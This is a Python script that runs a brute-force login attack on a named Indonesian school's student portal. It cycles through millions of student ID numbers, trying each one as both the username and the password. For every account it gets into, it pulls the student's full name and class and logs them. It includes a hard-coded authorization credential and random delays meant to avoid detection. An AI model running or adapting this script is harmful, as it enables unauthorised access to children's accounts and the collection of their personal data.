import requests
import json
import time
import random
from datetime import datetime

# File to log successful logins
log_file = "logs.txt"

# Headers for login request
login_headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'Authorization': 'Basic cGlqYXJza2xoOmJkMjdmM2E5LTk1Y2MtNDdlMS04Y2IzLTBkYmY2NjVhMWYzOQ==',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://siswa.pijarsekolah.id',
    'Referer': 'https://siswa.pijarsekolah.id/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"'
}

# Headers for status request (token will be added later)
status_headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Origin': 'https://siswa.pijarsekolah.id',
    'Referer': 'https://siswa.pijarsekolah.id/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"'
}

# URLs
login_url = 'https://auth-api.pijarsekolah.id/student/login'
status_url = 'https://auth-api.pijarsekolah.id/student/status'

# Function to try login with a specific NISN
def try_login(nisn):
    # Create login payload
    payload = {
        "username": nisn,
        "password": nisn,  # Password same as username
        "remember": False,
        "school": "https://siswa.pijarsekolah.id/sman3pati"
    }
    
    try:
        # Send login request
        response = requests.post(login_url, headers=login_headers, json=payload)
        
        # Check if login was successful
        if response.status_code == 200:
            data = response.json()
            if data.get('success') == True and 'data' in data and 'token' in data['data']:
                print(f"[+] Login successful for NISN: {nisn}")
                return data['data']['token']
        
        return None
    except Exception as e:
        print(f"[-] Error during login attempt for {nisn}: {str(e)}")
        return None

# Function to get user status using the token
def get_user_status(token):
    try:
        # Add token to headers
        headers_with_token = status_headers.copy()
        headers_with_token['Authorization'] = f'Bearer {token}'
        
        # Send status request
        response = requests.get(status_url, headers=headers_with_token)
        
        # Check if status request was successful
        if response.status_code == 200:
            return response.json()
        
        return None
    except Exception as e:
        print(f"[-] Error during status request: {str(e)}")
        return None

# Function to log successful login details
def log_success(nisn, class_name, full_name):
    with open(log_file, 'a') as f:
        f.write(f"[{class_name}] [{full_name}] : [{nisn}]\n")

# Main function to run the brute force attack
def main():
    start_nisn = 2000000  # Starting from 002000000
    end_nisn = 9999999    # Ending at 009999999
    
    print(f"[*] Starting brute force attack from {start_nisn} to {end_nisn}")
    print(f"[*] Results will be logged to {log_file}")
    
    # Create or clear the log file
    with open(log_file, 'w') as f:
        f.write(f"# Brute Force Results - {datetime.now()}\n")
    
    # Start the brute force loop
    for i in range(start_nisn, end_nisn + 1):
        nisn = f"00{i}"
        
        # Try login
        token = try_login(nisn)
        
        # If login successful, get user status
        if token:
            status_data = get_user_status(token)
            
            # If status request successful, log the details
            if status_data and 'fullName' in status_data and 'className' in status_data:
                class_name = status_data.get('className', 'Unknown')
                full_name = status_data.get('fullName', 'Unknown')
                
                print(f"[+] Found user: {full_name}, Class: {class_name}, NISN: {nisn}")
                log_success(nisn, class_name, full_name)
        
        # Add random delay to avoid detection (between 1 and 3 seconds)
        time.sleep(random.uniform(1, 3))

if __name__ == "__main__":
    main()
